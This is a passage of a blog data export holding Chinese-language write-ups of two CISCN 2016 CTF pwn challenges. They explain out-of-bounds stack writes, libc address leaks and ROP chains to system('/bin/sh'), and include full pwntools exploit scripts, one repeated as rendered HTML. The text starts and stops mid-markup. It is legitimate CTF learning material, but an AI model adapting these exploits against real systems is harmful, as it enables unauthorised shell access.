class=\"line\">\twdword(<span class=\"number\">52</span>,sh)</div><div class=\"line\">\tend()</div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>\n","excerpt":"<p>现在才知道原来system(“sh”)也可以拿shell……一直以为只能用system(“/bin/sh”)……</p>\n<p>题目是挺简单的，not stripped，PLT中直接有system入口，程序从main函数直接进initarray函数然后就没了，在initarray里有一个循环10次读一个字节到数组中，但是index可以越界，所以可以改写栈内存（同时又能把计循环次数的变量也给改了，所以可以无限循环）：</p>","more":"<p><img src=\"/images/ciscnctf_2016_careful_writeup0.png\" alt=\"ciscnctf_2016_careful_writeup0.png\"></p>\n<p>循环读完之后会把原来的数组位置print出来，不过这段似乎并没有什么卵用。</p>\n<p>由于PLT中已经有了system入口了，所以来个/bin/sh的地址就行了，于是为了这个地址我开始漫长的计划，先修改返回地址为printf构造参数泄漏出printf地址，找个pop｜ret的gadget再跳回循环读的地方，用system的PLT入口和算出来的/bin/sh地址再修改返回地址，完美，简直完美。</p>\n<p>完美个屁libc-database查不出远程glibc版本算不出偏移玩个毛线。</p>\n<p>后来才知道原来只要”sh”其实也是可以的，用ROPgadget搜出个”sh”就可以了,我真的是拒绝的。</p>\n<p>于是这么大一圈白绕了真尴尬，写都写了舍不得删，留作个too young的纪念吧。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./careful'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.32.79',10000)</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># popret='080483a1'</span></div><div class=\"line\"><span class=\"comment\"># printf='080483c0'</span></div><div class=\"line\"><span class=\"comment\"># fflush='080483d0'</span></div><div class=\"line\"><span class=\"comment\"># system='080483e0'</span></div><div class=\"line\"><span class=\"comment\"># print_got='0804a00c'</span></div><div class=\"line\"><span class=\"comment\"># begin='0804852D'</span></div><div class=\"line\"><span class=\"comment\"># out='08048563'</span></div><div class=\"line\"></div><div class=\"line\">system=<span class=\"string\">'080483e0'</span></div><div class=\"line\">sh=<span class=\"string\">'0804828e'</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(index,value)</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'index:'</span>)</div><div class=\"line\">\tp.sendline(str(index))</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'value:'</span>)</div><div class=\"line\">\tvalue=<span class=\"string\">'0A0A0A'</span>+value</div><div class=\"line\">\tc=c_int32(int(value,<span class=\"number\">16</span>)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">reset</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'00'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">end</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tw(<span class=\"number\">28</span>,<span class=\"string\">'11'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wdword</span><span class=\"params\">(index,word)</span>:</span></div><div class=\"line\">\tw(index,word[<span class=\"number\">6</span>:])</div><div class=\"line\">\tw(index+<span class=\"number\">1</span>,word[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">2</span>,word[<span class=\"number\">2</span>:<span class=\"number\">4</span>])</div><div class=\"line\">\tw(index+<span class=\"number\">3</span>,word[<span class=\"number\">0</span>:<span class=\"number\">2</span>])</div><div class=\"line\">\treset()</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\t<span class=\"string\">\"\"\"</div><div class=\"line\">\t# write print addr</div><div class=\"line\">\twdword(44,printf)</div><div class=\"line\">\twdword(48,popret)</div><div class=\"line\">\twdword(52,print_got)</div><div class=\"line\">\twdword(56,begin)</div><div class=\"line\">\t# wdword(60,popret)</div><div class=\"line\">\t# wdword(64,out)</div><div class=\"line\">\t# wdword(68,begin)</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tend()</div><div class=\"line\"></div><div class=\"line\">\trecv=p.recv(4)</div><div class=\"line\"></div><div class=\"line\">\tsys_addr=u32(recv.ljust(4,'\\x00'))</div><div class=\"line\">\tprint 'system addr: '+hex(sys_addr)</div><div class=\"line\">\tsh_addr=sys_addr-0x4cbd0+0x15d1a9</div><div class=\"line\">\tprint '/bin/sh addr: '+hex(sh_addr)</div><div class=\"line\"></div><div class=\"line\">\t# gdb.attach(p,'b *0x08048604')</div><div class=\"line\">\tp.sendline('28')</div><div class=\"line\">\tp.recvuntil('value:')</div><div class=\"line\">        value='0A0A0A00'</div><div class=\"line\">        c=c_int32(int(value,16)).value</div><div class=\"line\">\tp.sendline(str(c))</div><div class=\"line\"></div><div class=\"line\">\twdword(44,system)</div><div class=\"line\">\twdword(52,hex(sh_addr)[2:])</div><div class=\"line\">\tend()</div><div class=\"line\">\t# gdb.attach(p,'b *0x8048604')</div><div class=\"line\">\tp.interactive()</div><div class=\"line\">\t\"\"\"</span></div><div class=\"line\">\twdword(<span class=\"number\">44</span>,system)</div><div class=\"line\">\twdword(<span class=\"number\">52</span>,sh)</div><div class=\"line\">\tend()</div><div class=\"line\">\tp.interactive()</div><div class=\"line\"></div><div class=\"line\">main()</div></pre></td></tr></table></figure>"},{"title":"Ciscn CTF 2016 Cis2 writeup","date":"2016-07-11T10:13:00.000Z","_content":"\n这道题最终还是本地成功远程失败，这次的原因还是too young......还是再记录一下吧。\n\n可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。\n\n<!--more-->\n\n实力懵逼：\n![ciscnctf_2016_cis2_writeup0.png][1]\n\n这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：\n\n![ciscnctf_2016_cis2_writeup1.png][2]\n\n支持的操作数有'+','-','m','w','p','n','.','q',作用很显然：\n![ciscnctf_2016_cis2_writeup2.png][3]\n\n不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:\n\n```C\nvalues=&(stack[1]);\nindex=&(stack[0]);\n```\n\n所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。\n\n麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values[1]重写移向的地址。所以想要泄漏__libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向__libc_start_main+245这个地址就可以泄漏它。\n\n于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values[1]中，再使用'w'写入0x0x7fffffffe228。这个时候再使用'p'就可以泄漏__libc_start_main+245地址。\n![ciscnctf_2016_cis2_writeup3.png][4]\n\n接下来就需要类似的方式先写入values[1]再覆盖到目标地址中的方式（当然这个时候values[1]的位置也改变了），构造ROP链触发system('/bin/sh')了。\n\n但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势......\n\n所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去......\n\n还是附上可怜的expolit：\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./cis2')\n# p=remote('106.75.37.31',23333)\n\npop_rdi_ret=int('0x400ad3',16)\n\ndef w(high,value,low):\n\t# first move down\n\tfor x in range(high):\n\t\tp.sendline('w')\n\n\t# write into stack[2]\n\tp.sendline(str(value))\n\tprint 'write value: '+hex(c_uint32(value).value)\n\t# copy into stack[1]\n\tp.sendline('m')\n\n\tfor x in range(low):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\ndef main():\n\tp.recvuntil('Fight!\\n\\n')\n\n\t# begin\n\t# first get stack addr\n\tfor x in range(33):\n\t\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\taddr=p.recvline().strip()\n\taddr=int(addr,10)\n\n\tprint 'leak stack addr: '+hex(c_uint32(addr).value)\n\tstack_addr=addr-420\n\tdest_addr=stack_addr+65*4\n\tprint 'modify base addr to: '+hex(c_uint32(dest_addr).value)\n\n\tfor x in range(9):\n\t\tp.sendline('w')\n\t# write into stack[2]\n\tp.sendline(str(dest_addr))\n\t# copy into stack[1]\n\tp.sendline('+')\n\n\tfor x in range(17):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\n\t# now values[index] should point to __libc_start_main's address prefix\n\t# first leak libc_prefix\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_prefix=p.recvline().strip()\n\tlibc_prefix=int(libc_prefix,10)\n\tprint 'leak libc prefix: '+hex(c_uint32(libc_prefix).value)\n\n\t# now leak libc other address\n\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_addr=p.recvline().strip()\n\tlibc_addr=int(libc_addr,10)\n\tprint 'leak libc addr: '+hex(c_uint32(libc_addr).value)\n\n\tlibc_addr=libc_addr-245\n\t# I used libc-database to search the version of glibc on the remote once but I get nothing.\n\t# So I failed to get shell from remote.\n\tsys_addr=libc_addr-0x21a50+0x414f0\n\tbinsh_addr=libc_addr-0x21a50+0x161160\n\n\t#################################################################################\n\n\t# write pop gadget addr into stack \n\tw(17,pop_rdi_ret,19)\n\tw(17,0,18)\n\n\t# write /bin/sh addr to target addr\n\tw(16,binsh_addr,17)\n\tw(15,libc_prefix,16)\n\n\t# write sys addr to target addr\n\tw(14,sys_addr,15)\n\tw(13,libc_prefix,14)\n\n\t# gdb.attach(p,'b *0x400987')\n\tp.sendline('q')\n\t# get shell\n\tp.interactive()\n\nmain()\n```\n\n[1]: /images/ciscnctf_2016_cis2_writeup0.png\n[2]: /images/ciscnctf_2016_cis2_writeup1.png\n[3]: /images/ciscnctf_2016_cis2_writeup2.png\n[4]: /images/ciscnctf_2016_cis2_writeup3.png\n","source":"_posts/ciscnctf_2016_cis2_writeup.md","raw":"title: Ciscn CTF 2016 Cis2 writeup\n\ndate: 2016/07/11 18:13:00\n\n---\n\n这道题最终还是本地成功远程失败，这次的原因还是too young......还是再记录一下吧。\n\n可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。\n\n<!--more-->\n\n实力懵逼：\n![ciscnctf_2016_cis2_writeup0.png][1]\n\n这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：\n\n![ciscnctf_2016_cis2_writeup1.png][2]\n\n支持的操作数有'+','-','m','w','p','n','.','q',作用很显然：\n![ciscnctf_2016_cis2_writeup2.png][3]\n\n不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:\n\n```C\nvalues=&(stack[1]);\nindex=&(stack[0]);\n```\n\n所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。\n\n麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values[1]重写移向的地址。所以想要泄漏__libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向__libc_start_main+245这个地址就可以泄漏它。\n\n于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values[1]中，再使用'w'写入0x0x7fffffffe228。这个时候再使用'p'就可以泄漏__libc_start_main+245地址。\n![ciscnctf_2016_cis2_writeup3.png][4]\n\n接下来就需要类似的方式先写入values[1]再覆盖到目标地址中的方式（当然这个时候values[1]的位置也改变了），构造ROP链触发system('/bin/sh')了。\n\n但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势......\n\n所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去......\n\n还是附上可怜的expolit：\n\n```python\nfrom pwn import *\nfrom ctypes import *\n\np=process('./cis2')\n# p=remote('106.75.37.31',23333)\n\npop_rdi_ret=int('0x400ad3',16)\n\ndef w(high,value,low):\n\t# first move down\n\tfor x in range(high):\n\t\tp.sendline('w')\n\n\t# write into stack[2]\n\tp.sendline(str(value))\n\tprint 'write value: '+hex(c_uint32(value).value)\n\t# copy into stack[1]\n\tp.sendline('m')\n\n\tfor x in range(low):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\ndef main():\n\tp.recvuntil('Fight!\\n\\n')\n\n\t# begin\n\t# first get stack addr\n\tfor x in range(33):\n\t\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\taddr=p.recvline().strip()\n\taddr=int(addr,10)\n\n\tprint 'leak stack addr: '+hex(c_uint32(addr).value)\n\tstack_addr=addr-420\n\tdest_addr=stack_addr+65*4\n\tprint 'modify base addr to: '+hex(c_uint32(dest_addr).value)\n\n\tfor x in range(9):\n\t\tp.sendline('w')\n\t# write into stack[2]\n\tp.sendline(str(dest_addr))\n\t# copy into stack[1]\n\tp.sendline('+')\n\n\tfor x in range(17):\n\t\tp.sendline('.')\n\tp.sendline('w')\n\n\t# now values[index] should point to __libc_start_main's address prefix\n\t# first leak libc_prefix\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_prefix=p.recvline().strip()\n\tlibc_prefix=int(libc_prefix,10)\n\tprint 'leak libc prefix: '+hex(c_uint32(libc_prefix).value)\n\n\t# now leak libc other address\n\tp.sendline('.')\n\tp.sendline('p')\n\tp.recvuntil('Value: ')\n\tlibc_addr=p.recvline().strip()\n\tlibc_addr=int(libc_addr,10)\n\tprint 'leak libc addr: '+hex(c_uint32(libc_addr).value)\n\n\tlibc_addr=libc_addr-245\n\t# I used libc-database to search the version of glibc on the remote once but I get nothing.\n\t# So I failed to get shell from remote.\n\tsys_addr=libc_addr-0x21a50+0x414f0\n\tbinsh_addr=libc_addr-0x21a50+0x161160\n\n\t#################################################################################\n\n\t# write pop gadget addr into stack \n\tw(17,pop_rdi_ret,19)\n\tw(17,0,18)\n\n\t# write /bin/sh addr to target addr\n\tw(16,binsh_addr,17)\n\tw(15,libc_prefix,16)\n\n\t# write sys addr to target addr\n\tw(14,sys_addr,15)\n\tw(13,libc_prefix,14)\n\n\t# gdb.attach(p,'b *0x400987')\n\tp.sendline('q')\n\t# get shell\n\tp.interactive()\n\nmain()\n```\n\n[1]: /images/ciscnctf_2016_cis2_writeup0.png\n[2]: /images/ciscnctf_2016_cis2_writeup1.png\n[3]: /images/ciscnctf_2016_cis2_writeup2.png\n[4]: /images/ciscnctf_2016_cis2_writeup3.png\n","slug":"ciscnctf_2016_cis2_writeup","published":1,"updated":"2016-11-01T13:30:59.088Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuzk2oka0001r160homano1y","content":"<p>这道题最终还是本地成功远程失败，这次的原因还是too young……还是再记录一下吧。</p>\n<p>可能是上一题折腾太久了，拿到这一题直接file看一眼strings一下就直接拖进IDA静态分析了，就是忘了例行看一下checksec和vmmap，也可能是因为这么长一段时间接触的就没有不开NX的吧，突然来个都没开NX的完全就不记得还有这茬了，看来还是修为不够。</p>\n<a id=\"more\"></a>\n<p>实力懵逼：<br><img src=\"/images/ciscnctf_2016_cis2_writeup0.png\" alt=\"ciscnctf_2016_cis2_writeup0.png\"></p>\n<p>这道题还是挺简单的，就是循环读到token中，符合％d且index在1-46的话就可以写入这个stack中，不符合％d的话就按照操作数处理：</p>\n<p><img src=\"/images/ciscnctf_2016_cis2_writeup1.png\" alt=\"ciscnctf_2016_cis2_writeup1.png\"></p>\n<p>支持的操作数有’+’,’-‘,’m’,’w’,’p’,’n’,’.’,’q’,作用很显然：<br><img src=\"/images/ciscnctf_2016_cis2_writeup2.png\" alt=\"ciscnctf_2016_cis2_writeup2.png\"></p>\n<p>不过有个问题就是IDA把这里的变量名处理为stack，我觉得还是处理为values比较好，不然容易引起歧义，因为stack是main中出现过的一个变量名，用于定义values和index,大概是:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">values=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">1</span>]);</div><div class=\"line\">index=&amp;(<span class=\"built_in\">stack</span>[<span class=\"number\">0</span>]);</div></pre></td></tr></table></figure>\n<p>所以一开始的主要思路就是先操作index指向栈中存在的__libc_start_main+245的地址，把它泄漏出来，然后再根据末12bit查版本算偏移，在操作index重写返回地址就可以了。</p>\n<p>麻烦的就是对index的操作只能控制它任意向低地址移动，向高地址移动的话就会使用values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>重写移向的地址。所以想要泄漏<strong>libc_start_main+245的地址不能简单的向高处移动index，由于程序计算values[index]是通过values基址加index偏移得出来的，所以我们可以增大values基址使计算后的结果正好指向</strong>libc_start_main+245这个地址就可以泄漏它。</p>\n<p>于是以下图中的地址为例（0x7fffffffe220存储index指针，0x0x7fffffffe228存储values值），我们需要先向低地址移动泄漏栈地址，然后回来根据泄漏的栈地址计算修改后的values值，写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>中，再使用’w’写入0x0x7fffffffe228。这个时候再使用’p’就可以泄漏__libc_start_main+245地址。<br><img src=\"/images/ciscnctf_2016_cis2_writeup3.png\" alt=\"ciscnctf_2016_cis2_writeup3.png\"></p>\n<p>接下来就需要类似的方式先写入values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>再覆盖到目标地址中的方式（当然这个时候values<a href=\"/images/ciscnctf_2016_cis2_writeup0.png\">1</a>的位置也改变了），构造ROP链触发system(‘/bin/sh’)了。</p>\n<p>但是远程因为查不到glibc版本所以又跪了。看来查版本这招本来就不该算做正确姿势……</p>\n<p>所以正确姿势应该是在可读可写的区域直接写入shellcode再控制EIP进去……</p>\n<p>还是附上可怜的expolit：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">p=process(<span class=\"string\">'./cis2'</span>)</div><div class=\"line\"><span class=\"comment\"># p=remote('106.75.37.31',23333)</span></div><div class=\"line\"></div><div class=\"line\">pop_rdi_ret=int(<span class=\"string\">'0x400ad3'</span>,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">w</span><span class=\"params\">(high,value,low)</span>:</span></div><div class=\"line\">\t<span class=\"comment\"># first move down</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(high):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(value))</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'write value: '</span>+hex(c_uint32(value).value)</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'m'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(low):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Fight!\\n\\n'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># begin</span></div><div class=\"line\">\t<span class=\"comment\"># first get stack addr</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">33</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\taddr=p.recvline().strip()</div><div class=\"line\">\taddr=int(addr,<span class=\"number\">10</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak stack addr: '</span>+hex(c_uint32(addr).value)</div><div class=\"line\">\tstack_addr=addr<span class=\"number\">-420</span></div><div class=\"line\">\tdest_addr=stack_addr+<span class=\"number\">65</span>*<span class=\"number\">4</span></div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'modify base addr to: '</span>+hex(c_uint32(dest_addr).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">9</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\">\t<span class=\"comment\"># write into stack[2]</span></div><div class=\"line\">\tp.sendline(str(dest_addr))</div><div class=\"line\">\t<span class=\"comment\"># copy into stack[1]</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'+'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">17</span>):</div><div class=\"line\">\t\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'w'</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now values[index] should point to __libc_start_main's address prefix</span></div><div class=\"line\">\t<span class=\"comment\"># first leak libc_prefix</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_prefix=p.recvline().strip()</div><div class=\"line\">\tlibc_prefix=int(libc_prefix,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc prefix: '</span>+hex(c_uint32(libc_prefix).value)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># now leak libc other address</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'.'</span>)</div><div class=\"line\">\tp.sendline(<span class=\"string\">'p'</span>)</div><div class=\"line\">\tp.recvuntil(<span class=\"string\">'Value: '</span>)</div><div class=\"line\">\tlibc_addr=p.recvline().strip()</div><div class=\"line\">\tlibc_addr=int(libc_addr,<span class=\"number\">10</span>)</div><div class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">'leak libc addr: '</span>+hex(c_uint32(libc_addr).value)</div><div class=\"line\"></div><div class=\"line\">\tlibc_addr=libc_addr<span class=\"number\">-245</span></div><div class=\"line\">\t<span class=\"comment\"># I used libc-database to search the version of glibc on the remote once but I get nothing.</span></div><div class=\"line\">\t<span class=\"comment\"># So I failed to get shell from remote.</span></div><div class=\"line\">\tsys_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x414f0</span></div><div class=\"line\">\tbinsh_addr=libc_addr<span class=\"number\">-0x21a50</span>+<span class=\"number\">0x161160</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\">#################################################################################</span></div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write pop gadget addr into stack </span></div><div class=\"line\">\tw(<span class=\"number\">17</span>,pop_rdi_ret,<span class=\"number\">19</span>)</div><div class=\"line\">\tw(<span class=\"number\">17</span>,<span class=\"number\">0</span>,<span class=\"number\">18</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write /bin/sh addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">16</span>,binsh_addr,<span class=\"number\">17</span>)</div><div class=\"line\">\tw(<span class=\"number\">15</span>,libc_prefix,<span class=\"number\">16</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># write sys addr to target addr</span></div><div class=\"line\">\tw(<span class=\"number\">14</span>,sys_addr,<span class=\"number\">15</span>)</div><div class=\"line\">\tw(<span class=\"number\">13</span>,libc_prefix,<span class=\"number\">14</span>)</div><div class=\"line\"></div><div class=\"line\">\t<span class=\"comment\"># gdb.attach(p,'b *0x400987')</span></div><div class=\"line\">\tp.sendline(<span class=\"string\">'q'</span>)</div><div class=\"line\">\t<span class=\"comment\"># get 